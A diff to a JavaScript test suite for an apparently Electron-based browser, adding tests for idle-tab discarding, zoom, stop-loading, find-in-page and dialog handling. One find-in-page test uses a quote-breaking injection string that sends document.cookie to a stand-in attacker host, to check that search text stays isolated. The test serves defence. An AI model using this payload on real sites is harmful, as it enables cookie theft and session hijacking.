@@ -29,6 +29,9 @@ class FakeWebContents extends EventEmitter {
   getURL() { return this.url; }
   getTitle() { return this.url ? new URL(this.url).hostname : ""; }
   isLoading() { return false; }
+  close() { this.closed = true; }
+  isCurrentlyAudible() { return this.audible === true; }
+  isAudioMuted() { return this.muted === true; }
   stop() {}
   reload() {}
   executeJavaScript() { return Promise.resolve(null); }
@@ -286,7 +289,7 @@ test("address bar opens bare domains and turns ordinary text into a web search",
   await api.navigate("example.com/path");
   await api.navigate("research notes 2026");
   assert.equal(targets[0], "https://example.com/path");
-  assert.equal(targets[1], "https://duckduckgo.com/?q=research%20notes%202026");
+  assert.equal(targets[1], "https://www.google.com/search?q=research%20notes%202026");
 });
 
 test("address bar refuses explicit non-web schemes", async () => {
@@ -1136,4 +1139,210 @@ test("_findFirstOutboundLink records a dom_read error outcome when the page read
 
   assert.equal(link, null);
   assert.deepEqual(api.getMetricsSummary().dom_read.outcomes, { error: 1 });
+});
+
+function tabApi(clock) {
+  const api = makeApi(async () => ({ decision: "allow", reasons: [] }), { now: clock.now });
+  const removed = [];
+  api._window = { contentView: { addChildView() {}, removeChildView: (view) => removed.push(view) } };
+  return { api, removed };
+}
+
+test("an idle inactive tab is discarded: its view closes, its record stays, selecting it restores the page", async () => {
+  const clock = makeFakeClock(1_000);
+  const { api, removed } = tabApi(clock);
+  const first = await api.navigate("https://first.example");
+  const firstView = fakeViews.at(-1);
+  await api.newTab();
+  clock.advance(11 * 60_000);
+
+  assert.equal(api.discardIdleTabs(10 * 60_000), 1);
+  const snap = api.getSnapshot();
+  assert.equal(snap.tabs[0].discarded, true);
+  assert.equal(snap.tabs[0].url, "https://first.example/");
+  assert.equal(snap.tabs[1].discarded, false);
+  assert.deepEqual(removed, [firstView]);
+  assert.equal(firstView.webContents.closed, true);
+
+  const restored = await api.selectTab(first.tabs[0].id);
+  assert.equal(restored.page.url, "https://first.example/");
+  assert.equal(api.getSnapshot().tabs[0].discarded, false);
+  assert.equal(fakeViews.at(-1).webContents.url, "https://first.example/");
+});
+
+test("a tab is not discarded until it has been inactive for the idle window", async () => {
+  const clock = makeFakeClock(1_000);
+  const { api } = tabApi(clock);
+  await api.navigate("https://first.example");
+  clock.advance(60 * 60_000);
+  await api.newTab(); // first tab stops being active only now
+  clock.advance(60_000);
+  assert.equal(api.discardIdleTabs(10 * 60_000), 0);
+  clock.advance(10 * 60_000);
+  assert.equal(api.discardIdleTabs(10 * 60_000), 1);
+});
+
+test("the active tab, blank tabs, audible tabs and queued-action origin tabs are never discarded", async () => {
+  const clock = makeFakeClock(1_000);
+  const { api } = tabApi(clock);
+  const first = await api.navigate("https://a.example");
+  const tabA = first.tabs[0].id;
+  const viewA = fakeViews.at(-1);
+  await api.newTab();
+  await api.navigate("https://b.example");
+  const tabB = api.getSnapshot().tabs[1].id;
+  const third = await api.newTab();
+  clock.advance(60 * 60_000);
+
+  assert.equal(api.discardTab(third.activeTabId), false, "active (and blank) tab");
+  viewA.webContents.audible = true;
+  assert.equal(api.discardTab(tabA), false, "audible tab");
+  viewA.webContents.audible = false;
+  api._approvalQueue.push({ _originTabId: tabA });
+  assert.equal(api.discardTab(tabA), false, "origin of a queued action");
+  api._approvalQueue.length = 0;
+  assert.equal(api.discardTab(tabB), true);
+  assert.equal(api.discardTab(tabB), false, "already discarded");
+});
+
+test("closing a discarded tab works and does not touch a missing view", async () => {
+  const clock = makeFakeClock(1_000);
+  const { api } = tabApi(clock);
+  const first = await api.navigate("https://a.example");
+  await api.newTab();
+  clock.advance(60 * 60_000);
+  api.discardIdleTabs(10 * 60_000);
+  const after = await api.closeTab(first.tabs[0].id);
+  assert.equal(after.tabs.length, 1);
+});
+
+test("a muted tab that still reports an audio stream can be discarded", async () => {
+  const clock = makeFakeClock(1_000);
+  const { api } = tabApi(clock);
+  const first = await api.navigate("https://a.example");
+  const view = fakeViews.at(-1);
+  await api.newTab();
+  view.webContents.audible = true;
+  assert.equal(api.discardTab(first.tabs[0].id), false, "audible and not muted");
+  view.webContents.muted = true;
+  assert.equal(api.discardTab(first.tabs[0].id), true, "muted: the user hears nothing");
+});
+
+// --- page controls a person expects from any browser: stop loading, zoom, find in page ---
+
+function pageApi() {
+  const { api } = tabApi(makeFakeClock(1_000));
+  return api;
+}
+
+test("stopLoading stops the active page and leaves the snapshot readable", async () => {
+  const api = pageApi();
+  await api.navigate("https://one.example");
+  const wc = fakeViews.at(-1).webContents;
+  let stopped = 0;
+  wc.stop = () => { stopped += 1; };
+  const snap = await api.stopLoading();
+  assert.equal(stopped, 1);
+  assert.equal(snap.page.url, "https://one.example/");
+  const none = await pageApi().stopLoading();
+  assert.equal(none.page.hasPage, false, "no page: nothing to stop and no error");
+});
+
+test("zoom steps through the usual browser levels, stays inside them, resets, and belongs to the tab", async () => {
+  const api = pageApi();
+  await api.navigate("https://one.example");
+  const wc = fakeViews.at(-1).webContents;
+  const scripts = [];
+  wc.executeJavaScript = (code) => { scripts.push(code); return Promise.resolve(null); };
+  assert.equal(api.getSnapshot().page.zoom, 1);
+  assert.equal((await api.zoom("in")).page.zoom, 1.1);
+  assert.equal((await api.zoom("in")).page.zoom, 1.25);
+  assert.equal((await api.zoom("out")).page.zoom, 1.1);
+  assert.equal((await api.zoom("reset")).page.zoom, 1);
+  for (let i = 0; i < 40; i += 1) await api.zoom("in");
+  assert.equal(api.getSnapshot().page.zoom, 5, "the top level is a ceiling");
+  for (let i = 0; i < 40; i += 1) await api.zoom("out");
+  assert.equal(api.getSnapshot().page.zoom, 0.25, "the bottom level is a floor");
+  await assert.rejects(() => api.zoom("sideways"), RangeError);
+  assert.ok(scripts.some((code) => code.includes("zoom")), "the page is actually zoomed");
+  await api.zoom("in");
+  await api.newTab();
+  assert.equal(api.getSnapshot().page.zoom, 1, "a new tab starts at 100%");
+  await api.selectTab(api.getSnapshot().tabs[0].id);
+  assert.equal(api.getSnapshot().page.zoom, 0.33, "the first tab keeps its own level");
+});
+
+test("a page that finishes loading gets the tab's zoom again", async () => {
+  const api = pageApi();
+  await api.navigate("https://one.example");
+  const wc = fakeViews.at(-1).webContents;
+  await api.zoom("in");
+  const scripts = [];
+  wc.executeJavaScript = (code) => { scripts.push(code); return Promise.resolve(null); };
+  wc.emit("did-finish-load");
+  await Promise.resolve();
+  assert.ok(scripts.some((code) => code.includes("1.1")), "zoom is reapplied after a navigation");
+});
+
+test("findInPage searches the active page for plain text in an isolated world, steps forward and backward, and clears", async () => {
+  const api = pageApi();
+  await api.navigate("https://one.example");
+  const wc = fakeViews.at(-1).webContents;
+  const scripts = [];
+  const mainWorld = [];
+  wc.executeJavaScript = (code) => { mainWorld.push(code); return Promise.resolve(null); };
+  wc.executeJavaScriptInIsolatedWorld = (worldId, list) => { assert.notEqual(worldId, 0, "never the page's own world"); scripts.push(list[0].code); return Promise.resolve({ found: true, count: 3 }); };
+  assert.deepEqual(await api.findInPage("Add to cart"), { found: true, count: 3 });
+  assert.ok(scripts[0].includes(JSON.stringify("Add to cart")), "the text is one JSON string in the script");
+  await api.findInPage("Add to cart", { backwards: true });
+  assert.ok(scripts[1].includes("true"), "backwards is passed through");
+  const hostile = '"); fetch("https://evil.example/?"+document.cookie); ("';
+  await api.findInPage(hostile);
+  assert.equal(scripts[2].split(hostile).length, 1, "quotes cannot end the string and run page code");
+  for (const bad of ["", "   ", 5, null, "x".repeat(201)]) await assert.rejects(() => api.findInPage(bad), RangeError, JSON.stringify(bad));
+  await api.clearFind();
+  assert.ok(scripts.at(-1).includes("removeAllRanges"));
+  assert.equal(mainWorld.length, 0, "nothing the person searched for reaches the page's own scripts");
+  wc.executeJavaScriptInIsolatedWorld = () => Promise.reject(new Error("page gone"));
+  assert.deepEqual(await api.findInPage("x"), { found: false, count: 0 }, "a page that cannot run scripts finds nothing instead of throwing");
+  delete wc.executeJavaScriptInIsolatedWorld;
+  assert.deepEqual(await api.findInPage("x"), { found: false, count: 0 }, "no isolated world: nothing is searched rather than fall back to the page's world");
+  assert.equal(mainWorld.length, 0);
+});
+
+test("a dialog on the person's tab is shown with its site and answered once by the person", async () => {
+  const api = pageApi();
+  await api.navigate("https://shop.example/cart");
+  const wc = fakeViews.at(-1).webContents;
+  const answers = [];
+  wc.answerDialog = async (accept, text) => { answers.push([accept, text]); return true; };
+  const emitted = [];
+  api.onUpdate?.((s) => emitted.push(s));
+  wc.emit("javascript-dialog-opening", { type: "confirm", message: "Delete this item?", defaultPrompt: "" });
+  const shown = api.getSnapshot().page.dialog;
+  assert.deepEqual(shown, { type: "confirm", message: "Delete this item?", defaultPrompt: "", origin: "https://shop.example" }, "the site that asks is the host's own reading of the tab, not the page's words");
+  await assert.rejects(() => api.answerDialog("yes"), TypeError, "accept must be a boolean");
+  await assert.rejects(() => api.answerDialog(true, "x".repeat(2001)), RangeError);
+  const after = await api.answerDialog(true);
+  assert.deepEqual(answers, [[true, undefined]]);
+  assert.equal(after.page.dialog, null, "answered once, then gone");
+  await assert.rejects(() => api.answerDialog(false), /no dialog/);
+  wc.emit("javascript-dialog-opening", { type: "prompt", message: "List name?", defaultPrompt: "x" });
+  await api.answerDialog(true, "Groceries");
+  assert.deepEqual(answers.at(-1), [true, "Groceries"]);
+  wc.emit("javascript-dialog-opening", { type: "alert", message: "Saved" });
+  wc.emit("javascript-dialog-closed");
+  assert.equal(api.getSnapshot().page.dialog, null, "a dialog that closed some other way (navigation) is cleared");
+});
+
+test("a dialog on a tab in the background belongs to that tab and shows when the person returns to it", async () => {
+  const api = pageApi();
+  await api.navigate("https://one.example");
+  const firstWc = fakeViews.at(-1).webContents;
+  const firstId = api.getSnapshot().activeTabId;
+  await api.newTab();
+  firstWc.emit("javascript-dialog-opening", { type: "alert", message: "Session expired" });
+  assert.equal(api.getSnapshot().page.dialog, null, "the tab in front has no dialog");
+  await api.selectTab(firstId);
+  assert.equal(api.getSnapshot().page.dialog.message, "Session expired");
 });
